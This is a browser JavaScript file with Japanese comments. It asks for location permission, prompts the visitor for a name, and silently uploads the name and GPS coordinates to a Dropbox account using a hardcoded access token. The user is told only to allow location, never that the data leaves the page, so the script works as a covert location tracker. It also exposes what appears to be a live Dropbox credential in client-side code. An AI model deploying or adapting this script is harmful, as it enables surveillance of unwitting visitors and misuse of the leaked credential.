alert("位置情報を許可してね");

// Dropboxアクセストークン
const accessToken = 'sl.BhWCKr5-OlGehYpFyqJNHjH5Ipp4tTvX-wCS6JkOAJmAuTYRGsDf_H-9N3y3Tnh4Y28j4lrgA5wD79dNrvtZYq5sKXnXAcj-83AEdhNv3oEbFL4SXHXv55ZfajS_02RSmB1U8Lqkp6ok';

// 位置情報の取得
navigator.geolocation.getCurrentPosition(function(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;

  // ファイル名のプロンプト
  const fileName = prompt('名前を入力してください（3文字以上かつ漢字を含む）');

  if (fileName && fileName.length >= 3 && /[一-龯]/.test(fileName)) {
    // テキストデータの作成
    const textData = `名前: ${fileName}\n緯度: ${latitude}, 経度: ${longitude}`;

    // ランダムなファイル名を生成
    const randomString = Math.random().toString(36).substring(2);
    const filePath = '/' + randomString + '.txt';

    // テキストデータをバイナリデータに変換
    const encoder = new TextEncoder();
    const textDataArray = encoder.encode(textData);

    // バイナリデータをBlobオブジェクトに変換
    const blob = new Blob([textDataArray.buffer], { type: 'application/octet-stream' });

    // Dropboxへのファイル保存リクエスト
    fetch('https://content.dropboxapi.com/2/files/upload', {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + accessToken,
        'Content-Type': 'application/octet-stream',
        'Dropbox-API-Arg': JSON.stringify({
          path: filePath,
          mode: 'add',
          autorename: false,
          mute: true
        })
      },
      body: blob
    })
    .then(response => {
      console.log('データが保存されました。');

      // 名前を保存するテキストファイルのパス
      const nameFilePath = '/names.txt';

      // テキストデータをバイナリデータに変換
      const nameEncoder = new TextEncoder();
      const nameDataArray = nameEncoder.encode(fileName + '\n');

      // バイナリデータをBlobオブジェクトに変換
      const nameBlob = new Blob([nameDataArray.buffer], { type: 'application/octet-stream' });

      // Dropboxへのファイル保存リクエスト
      fetch('https://content.dropboxapi.com/2/files/upload', {
        method: 'POST',
        headers: {
          'Authorization': 'Bearer ' + accessToken,
          'Content-Type': 'application/octet-stream',
          'Dropbox-API-Arg': JSON.stringify({
            path: nameFilePath,
            mode: 'add',
            autorename: false,
            mute: true
          })
        },
        body: nameBlob
      })
      .then(response => {
        console.log('名前が保存されました。');
      })
      .catch(error => {
        console.error('名前の保存中にエラーが発生しました:', error);
      });
    })
    .catch(error => {
      console.error('ファイルの保存中にエラーが発生しました:', error);
    });
  } else {
    console.log('名前が条件を満たしていません。処理を中止します。');
  }
}, function(error) {
  console.error('位置情報の取得中にエラーが発生しました:', error);

  // 実行中のすべてのインターバルをクリア
  let intervalId = window.setInterval(null, 0);
  while (intervalId >= 0) {
    window.clearInterval(intervalId);
    intervalId--;
  }
});
